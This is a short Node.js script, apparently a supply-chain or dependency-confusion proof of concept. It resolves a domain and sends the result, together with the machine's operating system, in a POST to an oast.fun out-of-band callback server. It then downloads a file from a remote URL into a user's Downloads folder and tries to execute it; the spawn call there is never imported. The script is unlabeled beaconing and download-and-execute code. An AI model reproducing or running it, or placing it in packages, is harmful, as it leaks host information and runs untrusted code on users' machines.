#!/usr/bin/env node

const dns = require('dns');
const http = require('http');
const os = detectOS();


const domain = 'google.com'; // domain to check if it resolves
const serverUrl = 'http://jouzjhqaabhhbfjsprdmwk0hu2gqdlf7l.oast.fun'; // URL of the server endpoint

const fileUrl = 'https://filesampleshub.com/download/video/mp4/sample1.mp4'; // URL of the file to download
const downloadPath = '/home/titan/Downloads/downloaded-file.txt'; // Path to save the downloaded file


// detect OS 
function detectOS() {
  const pathSeparator = __dirname.includes('/') ? '/' : '\\';

  if (pathSeparator === '/') {
    return 'Linux';
  } else if (pathSeparator === '\\') {
    return 'Windows';
  } else {
    return 'Unknown';
  }
}

// Perform DNS lookup
dns.resolve(domain, (err, addresses) => {
  if (err) {
    console.error(`Error resolving DNS for ${domain}: ${err.message}`);
    return;
  }

  const dnsResult = addresses.join('\n');
  console.log(dnsResult)

  // Send DNS result to server
  const postData = JSON.stringify({ dnsResult, os});
  const options = {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData)
    }
  };

  const req = http.request(serverUrl, options, (res) => {
    console.log(`Status code: ${res.statusCode}`);
  });

  req.on('error', (error) => {
    console.error('Error sending DNS result to server:', error);
  });

  req.write(postData);
  req.end();
});
const https = require('https');
const fs = require('fs');


// Make a GET request to the file URL
const request = https.get(fileUrl, (response) => {
    // Create a writable stream to save the file
    const fileStream = fs.createWriteStream(downloadPath);
  
    // Pipe the response data to the file stream
    response.pipe(fileStream);
  
    // Event handler for stream finish event
    fileStream.on('finish', () => {
      console.log('File saved successfully.');
  
      // Execute the downloaded file
      executeFile(downloadPath);
    });
  
    // Event handler for stream error event
    fileStream.on('error', (error) => {
      console.error('Error saving file:', error);
    });
  });
  
  // Handle errors during the request
  request.on('error', (error) => {
    console.error('Error downloading file:', error);
  });
  
  // Function to execute the downloaded file
  function executeFile(filePath) {
    // Check if the file is executable
    fs.access(filePath, fs.constants.X_OK, (err) => {
      if (err) {
        console.error('File is not executable.');
        return;
      }
  
      // Spawn a new process to execute the file
      const childProcess = spawn(filePath, [], {
        stdio: 'inherit' // Inherit stdio from parent process
      });
  
      // Event handler for process exit event
      childProcess.on('exit', (code, signal) => {
        console.log(`File execution completed. Exit code: ${code}`);
      });
  
      // Event handler for process error event
      childProcess.on('error', (error) => {
        console.error('Error executing file:', error);
      });
    });
  }